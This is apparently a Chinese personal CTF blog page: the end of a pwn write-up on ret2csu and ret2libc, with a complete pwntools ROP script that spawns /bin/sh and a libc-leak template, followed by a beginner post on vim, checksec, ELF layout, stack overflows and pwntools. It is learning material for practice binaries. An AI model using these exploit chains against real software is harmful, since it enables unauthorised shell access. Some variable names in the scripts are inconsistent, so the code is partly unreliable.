<p><strong>此时一个重要的思想出来，在程序中的__libc_csu_init函数，能有大用，改变某些寄存器的作用</strong><br>这便是ret2csu的思想，将程序导入__libc_csu_init函数中从而改变一些gadget不能改变的寄存器的值<br><img src="http://blog.forevers.love/usr/uploads/2023/12/4152783716.png" alt="屏幕截图 2023-12-09 192250.png">![屏幕截图 2023-12-09 192250](wp&#x2F;屏幕截图 2023-12-09 192250.png)<br>在这里便可以先让程序执行0x4012DA地址的指令，修改rbx,rbp,r12,r13,r14,r15寄存器的值，然后在使程序执行0x4012C0地址的指令，从而修改rdx,rsi,edi的值（虽然是edi不是rdi，但是也可以相当于改变rdi，一般用不到前面的位数改变后面的足够了）最后的call可以直接跳转到一个函数出执行（这里有一个大坑，后面慢慢讲)</p>
<p>到了此时便只差rax的值不能改变，在程序中慢慢找看看能不能找到可以改变的地方<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1473558961.png" alt="屏幕截图 2023-12-09 194646.png">![屏幕截图 2023-12-09 194646](wp&#x2F;屏幕截图 2023-12-09 194646.png)<br>好，找到了，在0x40119e及后面的指令在利用后刚好能将edi中的值传输到eax中（在64为系统中主用的是r开头的寄存器，e开头寄存器就是r开头的寄存器的后半部分，大部分情况下，r开头的寄存器前半部分的值用不到的，e的改变足够用），在这里还有一个很重要的点，我们是先将edi的值传进[rbp+var_4]，在将[rbp+var_4]传进eax中，于是我们必须要保证[rbp+var_4]中的值是一个空但有限的地址，在bss段中选择。（var_4在前面有定义，但不用管比较小，只要保证rbp中的地址空并且有效就行)</p>
<p>由于本题中需要用到的空地址有点多，先讲一下空地址的选择<br>由于我们在调用gets函数需要向空地址写入数据，便要找到一个可写的地址，而bss段便是一个可写的地方，我们可以通过gdb调试中寻找在gdb调试进入程序后输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
<p>命令便可以看到每一段地址对应的能力，然后在确认好地址后用如下命令查看地址对应的存放情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">20</span>gx 地址名<span class="comment">//20代表的是从该地址往后的20字节的地址都显示出来</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/12/3926396535.png" alt="屏幕截图 2023-12-09 201100.png">![屏幕截图 2023-12-09 201100](wp&#x2F;屏幕截图 2023-12-09 201100.png)<br>如此便可以确认这个地址是一个可写的空的有效的地址</p>
<p>如此我们便可以将这个题的全部思路写出来，在一开始直接向程序中输入24个垃圾字节数据进行栈溢出，用于劫持程序，然后利用gets函数输入&#x2F;bin&#x2F;sh字符串，<br>在这里会出现一个事情，我们要向一个特定地址输入字符，而gets函数的原型是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br></pre></td></tr></table></figure>
<p>于是在执行gets函数中时便会向先调用rdi寄存器（rdi为最常用的通用寄存器）中的值作为函数输入的值的存放地址，<br>于是我们便要向rdi赋一个空地址，然后才调用gets函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)<span class="comment">//get地址为plt段的地址，0x404480空地址</span></span><br></pre></td></tr></table></figure>
<p>然后程序便等待输入，输入的过程可以在后面重新开一个新的payload2用于输入数据</p>
<p>在输入完成后开始对其他寄存器的值开始改变，先改变rax中的值为0x3b，将rdi中的值改变为0x3b，然后将rbp赋值为一个空地址为是程序执行下去，在程序后面还要在加一个空地址用于解决pop rbp指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+p64(edi_eax)+p64(<span class="number">0x404580</span>)<span class="comment">//两个地址都是空地址，edi_eax是指令的开始</span></span><br></pre></td></tr></table></figure>

<p>现在rax的值已经改为0x3b，然后将r12,r13,r14,r15改为&#x2F;bin&#x2F;sh的地址，0,0,call要调转的地方。然后再执行mov的指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - <span class="number">403E10</span>h)[r15+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>这里有一个特殊的地方，call的跳转并不会直接跳转到那个指令的地址，然后执行，而是会将[r15+rbx*8]的地址所存放的地址先读取了，跳转到那个地址然后执行，所以在gets函数输入处不只要&#x2F;bin&#x2F;sh还要syscall指令的地址，然后在让call的调转到gets函数输入的syscall指令的地址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line"><span class="comment">//0x4012C0是mov的指令，0x404488是syscall指令地址存放的地址，</span></span><br><span class="line"><span class="comment">//0x404480是/bin/sh存放的地址</span></span><br></pre></td></tr></table></figure>
<p>第一个payload构造完成<br>开始构造第二个payload2，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+p64(syscall)</span><br><span class="line"><span class="comment">///bin/sh\x00刚好有8个字节于是再后面syscall的指令，</span></span><br><span class="line"><span class="comment">//刚好是放在/bin/sh的地址加8位后，</span></span><br></pre></td></tr></table></figure>
<p>好，给出完整的脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta">#context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">pop_rbp_ret=<span class="number">0x40117d</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x4012e1</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4012e3</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012de</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">edi_eax=<span class="number">0x40119E</span></span><br><span class="line">main=<span class="number">0x401223</span></span><br><span class="line">gets=<span class="number">0x401090</span></span><br><span class="line">getplt=<span class="number">0x404028</span></span><br><span class="line">pop_r12_pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012dc</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+</span><br><span class="line">p64(edi_eax)+p64(<span class="number">0x404580</span>)+p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">+p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x4012C0&#x27;</span>) </span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.sendline(payload)<span class="comment">//第一次传入</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)第二次传入</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>#ret2libc<br>在这里将之间讲述无system和无&#x2F;bin&#x2F;sh的情况将32位与64位分开讲述</p>
<p><strong>32位</strong><br>在这类题中一般是动态链接很多操作都不能执行<br>更多的知识不多讲直接将做题的过程<br>对于这种题我们一般可以先调用可已打印东西的函数，如puts的函数将got中谋个函数的地址答应出来，根据动态链接的延迟绑定规定，在第一次调用某个函数之后其在动态链接库中的地址将被写入got表中，我们便可以同过put等打印数据的函数将其打印出来地址，这个地址便是该函数在动态链接库中对应的地址，在题中有很大的可能这个地址是一个变化中的地址，这是系统的一种保护操作，但是一般答应出来的后3位（16进制的数）是不会变的，而我们便可以将这后3位的地址用于判断其动态链接库的类型，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher<span class="comment">//这个可用于自动寻找库，不过可能有点老，反正我没有用这个成功过</span></span><br><span class="line">io=process(<span class="string">&#x27;./文件名&#x27;</span>)</span><br><span class="line">puts_plt=<span class="number">0x00000</span><span class="comment">//puts在plt段的地址，可以直接在ida中找也可以用链接文件后直接用程序找</span></span><br><span class="line">main=<span class="number">0x00000</span><span class="comment">//main函数在text段中的地址，用于在打印地址后返回main从新开始执行</span></span><br><span class="line">libc_start_main=<span class="number">0x000000000</span><span class="comment">//got段中的libc_start_main的地址，在第一次调用后会有真实地址，打印出来</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span>+p32(put_plt)+p32(main)+p32(libc_start_main)</span><br><span class="line"><span class="comment">//32位的函数调用特点，间隔一个放参数。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)<span class="comment">//可用可不用，关键根据当时的情况来加入，括号内是程序的输出</span></span><br><span class="line">libcaddr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">//用于接收用puts函数打印出来的__libc_start_main函数的真实地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在有libc_start_main函数的真实地址后，可以在网上查找函数的偏移地址<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3046998676.png" alt="屏幕截图 2023-12-09 220543.png">![屏幕截图 2023-12-09 220543](wp&#x2F;屏幕截图 2023-12-09 220543.png)<br>一般来说真实地址的值会因为保护程序的存在而使中间的地址被随机化，但最后的3位（16进制)不会被改变，便可以通过后3位查到偏移量，<br><strong>程序的基本地址&#x3D;__libc_start_main函数的真实地址-__libc_start_main函数的偏移量<br>system函数的真实地址&#x3D;程序的基本地址+system函数的偏移量<br>str_bin_sh函数的真实地址&#x3D;程序的基本地址+str_bin_sh函数的偏移量</strong></p>
<p>然后调用system函数利用str_bin_sh函数，便也可以获得控制权，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">system=<span class="number">0x00000</span><span class="comment">//system函数的偏移地址，</span></span><br><span class="line">str_bin_sh=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">以上这三个的数值由网上查阅</span><br><span class="line">libcbase_addr=libcaddr-__libc_start_main</span><br><span class="line">system_addr=libcbase_addr+system</span><br><span class="line">binsh_addr=libcbase_addr+str_bin_sh</span><br><span class="line">payload2 = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span> + p32(sys_addr) + b<span class="number">&#x27;</span>AAAA<span class="number">&#x27;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">//这里中间的数为了平衡栈顶要在中间加上4字节的垃圾数据</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果要使用LibcSearcher来用着要在要在前面加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br></pre></td></tr></table></figure>



      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-博客" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2/" class="article-date">
  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/%E5%8D%9A%E5%AE%A2/">
        pwn基操
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>一vim</strong></p>
<p>vim是我们在使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>是经常会使用的工具，新手总是忘记使用方法（当然我也是）。在这里记录下常用命令以防止以后再忘记</p>
<p>1，进入编辑模式： i （在当前位置插入，开始编辑）；</p>
<p>2,保存编辑文本： :w (英文冒号，保存当前编辑的文件）；</p>
<p>3,退出编辑文件： :q（英文冒号，退出当前编辑的文件）；</p>
<p>4,保存并退出： :wq （英文冒号，保存并退出当前编辑的文件）；</p>
<p>5.强制退出：  :q! （英文冒号，强制退出不保存）。</p>
<p>.在vim命令行下输入from</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6,:%!xxd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“%!”为调用第三方操作对vim内容进行操作，如 :%!tr a-z A-Z 把全文小写字母改成大写。<br>xxd 命令可以为给定的标准输入或者文件做一次十六进制的输出，它也可以将十六进制输出转换为原来的二进制格式，即将任意文件转换为十六进制或二进制形式。</p>
</blockquote>
<p>所以，使用命令之后，会把文档改成十六进制显示。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>,:%!xxd <span class="literal">-r</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>xxd -r 逆向操作:把十六进制转储转换成二进制形式。如果不输出到标准输出,xxd并不把输出文件截断,而是直接写到输出文件。</p>
</blockquote>
<p>9,file+文件名，用于识变文件是什么类型的文件，（与文件的后缀无关），同时也通过这个判断是什么文件x32，x64</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wzg@wzg-virtual-machine:~$ file text.c</span><br><span class="line">text.c: C source, ASCII text</span><br></pre></td></tr></table></figure>

<p>10,text.c是一个C语言源代码，ascll编码的文本</p>
<p>11,rm+文件名，删除那个文件</p>
<p>12,gcc -S 文件名，可以将文件改为汇编语言文件</p>
<p>13，<code>checksec +文件名</code>，查看文件是否有保护程序</p>
<p>![屏幕截图 2023-11-24 205006](博客\屏幕截图 2023-11-24 205006.png)</p>
<p>PIE：•程序的防护措施，</p>
<p>编译时生效，随机化ELF文件的映射地址，</p>
<p>开启 ASLR 之后，PIE 才会生效。</p>
<p>NX•程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现，</p>
<p>通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。</p>
<p>canary：•程序的防护措施，编译时生效</p>
<p>•在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的，*.canary长度为1字长，其位置不一-&#x2F;14578定与ebp&#x2F;rbp存储的位置相邻，具体得看程序的汇编操作。</p>
<p>RELRO：•程序的防护措施，编译时生效</p>
<p>•部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</p>
<p>•完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址。</p>
<p>![屏幕截图 2023-11-18 193922](博客\屏幕截图 2023-11-18 193922.png)</p>
<p>可执行文件</p>
<p>广义：文件中的数据是可执行代码的文件.out、.exe、.sh、.py</p>
<p>狭义：文件中的数据是机器码的文件.out、.exe、.dll、.so</p>
<p>分类：</p>
<p>Windows：PE（Portable Executable）可执行程序.exe动态链接库.dll静态链接库.lib</p>
<p>Linux：ELF（Executable and Linkable Format）可执行程序.out动态链接库.so静态链接库.a</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/(%E5%8D%9A%E5%AE%A2%5C%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="image-20231118202418867"></p>
<p>•ELF文件头表（ELF header）</p>
<p>•记录了ELF文件的组织结构</p>
<p>给系统看</p>
<p>•</p>
<p>•程序头表&#x2F;段表（Program header table）</p>
<p>•告诉系统如何创建进程</p>
<p>•生成进程的可执行文件必须拥有此结构</p>
<p>•重定位文件不一定需要</p>
<p>•</p>
<p>•节头表（Section header table）&#x2F;&#x2F;用来组织elf文件春村</p>
<p>•记录了ELF文件的节区信息</p>
<p>•用于链接的目标文件必须拥有此结构</p>
<p>其它类型目标文件不一定</p>
<p>•代码段（Text segment）包含了代码与只读数据</p>
<p>•.text 节&#x2F;&#x2F;</p>
<p>•.rodata 节 </p>
<p>•.hash 节 </p>
<p>•.dynsym 节 </p>
<p>•.dynstr 节 </p>
<p>•.plt 节&#x2F;&#x2F;</p>
<p>•.rel.got 节 </p>
<p>•……</p>
<p>•数据段（Data segment）包含了可读可写数据</p>
<p>•.data 节 </p>
<p>•.dynamic 节 </p>
<p>•.got 节 </p>
<p>•.got.plt 节&#x2F;&#x2F;用于保存plt节中的代码解析到实际的动态连接的函数的地址</p>
<p>•.bss 节&#x2F;&#x2F;只在内存中占空间不在磁盘中占有空间</p>
<p>•……</p>
<p>•栈段（Stack segment）</p>
<p>![屏幕截图 2023-11-19 102459](博客\屏幕截图 2023-11-19 102459.png)</p>
<p>kemel，内核</p>
<p>starck堆栈</p>
<p>shared libraries，共享库</p>
<p>heap堆，动态存储区，malloc在程序执行后才有的空间在其中</p>
<p>unused未使用 </p>
<p>text代码段：main函数，sum函数，具体实现的机械码都放在其中，会有一些不可写的代码</p>
<p>data段会存放已初始化的全局变量，str</p>
<p>bss段存放未初始化的全局变量，glb（不占用内存空间）</p>
<p>![屏幕截图 2023-11-19 105211](博客\屏幕截图 2023-11-19 105211.png)</p>
<p>小端序：数据从左往右，存的时候从下到上</p>
<p>​     </p>
<p>•RIP</p>
<p>•存放当前执行的指令的地址</p>
<p>•RSP</p>
<p>•存放当前栈帧的栈顶地址</p>
<p>•RBP</p>
<p>•存放当前栈帧的栈底地址</p>
<p>•RAX</p>
<p>•通用寄存器。存放函数返回值</p>
<p>栈（stack）：地址从高地址往低地址增长（从上往下），</p>
<p>堆（heap）：地址从低地址往高地址增长（从下往上），</p>
<p>在栈和堆中有shared libraries（共享库），且大小为止，通过两者不同的增长方向使其充分利用空间</p>
<p> ![屏幕截图 2023-11-19 114829](博客\屏幕截图 2023-11-19 114829.png)</p>
<p>high address高地址；caller’s Function state函数功能状态;stack top顶端;low address低地址</p>
<p>![屏幕截图 2023-11-19 120035](博客\屏幕截图 2023-11-19 120035.png)</p>
<p>•函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p>
<p>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p>
<p>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p>•下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p>
<p>•首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p>
<p>![image-20231119143141350](博客&#x2F;屏幕截图 2023-11-19 120035-17115442857899-171154428701611-171154428884713-171154429006215.png)</p>
<p>​                                    将被调用函数的参数压入栈内</p>
<p>high address高地址；low address低地址；return address回信地址；stack top顶端；caller访客；</p>
<p>function state功能状态;</p>
<p>（1）esp：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p>
<p>（2）ebp：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
<p>在栈中ebp常常保存着的是上一个函数的返回值，用于在栈使用完后返回之前的函数，在栈顶</p>
<p>其中的值是一个指针指向原来的函数的栈低。</p>
<p>在ebp的更高一位地址有一个更为重要的域：return address![屏幕截图 2023-11-20 210719](博客\屏幕截图 2023-11-20 210719.png)</p>
<p>当一个域的函数执行完其中的代码开始执行return前，会先将栈中的esp移到与ebp相同的指向地址并指向这里</p>
<p>之后由于ebp中存放的是上一个函数的返回值，ebp便通过这个地址指向上一个函数栈顶，同时存放再上一个函数的返回值，与此同时esp自动加一指向return address；</p>
<p>在ebp和esp中有一个变量可以由我们向其中输入无限的变量，那我们便可通过输入的数据将ebp指向的上面的数据覆盖，然后在程序执行时，到返回地址时由于已经被我们写入的数据覆盖，会直接返回我们写入的地址，从而达到我们的目标，在ida中我们可以先找到那个变量，便可以看到他与ebp和esp的距离，如：char s;&#x2F;&#x2F; [esp+1ch] [ebp-64h]（可能会出现错误，如果有错用动态调试）,我们可以看到此时的s变量距离ebp是0x64字节，当我们向其中写入0x64个字节的数据便可以到ebp的位置，在向上写4个字节便可以覆盖ebp指向的位置，在写4个字节便是要返回的话数值，于是我们只要想s中写入0x68字节的垃圾数据和0x4个字节的特殊数据便可以在函数执行后不正常反悔而是返回到我们需要的值。</p>
<p>通过sub   esp，空间大小           确定栈的空间大小；</p>
<p>esp始终指向栈顶，ebp是在堆栈中寻址用的</p>
<p><strong>栈帧</strong>也叫过程活动记录，是编译器用来实现过程&#x2F;函数调用的一种数据结构。简言之，<strong>栈帧</strong>就是利用<code>EBP</code>（栈帧指针，<strong>请注意不是ESP</strong>）寄存器访问局部变量、参数、函数返回地址等</p>
<p><strong>栈溢出</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">read(<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面那个程序中str在main函数中栈有8个字节的缓冲区，通过read函数输入值进入str中</p>
<p>在机械执行的过程先将ebq入栈，用于固定返回位置，但是在输入值时由于超出str的区域，使得原本用于返回的值被覆盖，当程序执行到那时不在返回原本应该返回的值，从而出现错误。</p>
<p>00</p>
<p>传参：</p>
<p>•x86</p>
<p>•使用栈来传递参数</p>
<p>•使用 eax 存放返回值</p>
<p>•amd64</p>
<p>•前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中</p>
<p>•第7个以后的参数存放于栈中</p>
<p>nc+网址 用于远程链接 </p>
<p><strong>pwntools</strong></p>
<p>在python中 先输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>

<p>导入环境，通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>与本地的程序建立一个链接，并获的pid：进程号（文件要是可执行文件）；通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>,端口)</span><br></pre></td></tr></table></figure>

<p>与远程端口链接。吧“</p>
<p>在于端口连接后需要接送端口传来的数据可以通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvline()</span><br></pre></td></tr></table></figure>

<p>接收传来的一行数据，但只能是一行，</p>
<p>若要向端口传输数据，需注意由于是端口只能传输数据流，需进行特殊处理</p>
<p>传整数，根据传输对象加上p32（）或者p64（），在字符串前加上b(“”)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0x75834</span>))<span class="comment">//也可以换send但要在字符串后加\n</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;程序的输出&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>若端口在接收数据后会返回程序通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<p>一般在最后会加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive() 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</span><br></pre></td></tr></table></figure>

<p>接收端口的返回</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(b<span class="string">&quot;;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以为接收程序发的数据直到；这个符号为止</p>
<p>写Python脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">    ...</span><br><span class="line">io.interactive()    </span><br></pre></td></tr></table></figure>

<p>写好之后用python +这个文件名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *地址&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>用于在程序进行之中时，进入调试状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;main_real_addr:&quot;</span>,main_real_addr)</span><br></pre></td></tr></table></figure>



<p>ljust() 方法将使用指定的字符（默认为空格）作为填充字符使字符串左对齐</p>
<ul>
<li><p><input disabled type="checkbox"> 
在pwntools中shellcraft.sh   shellcode      elf.search，ljust</p>
</li>
<li><p><input disabled type="checkbox"> </p>
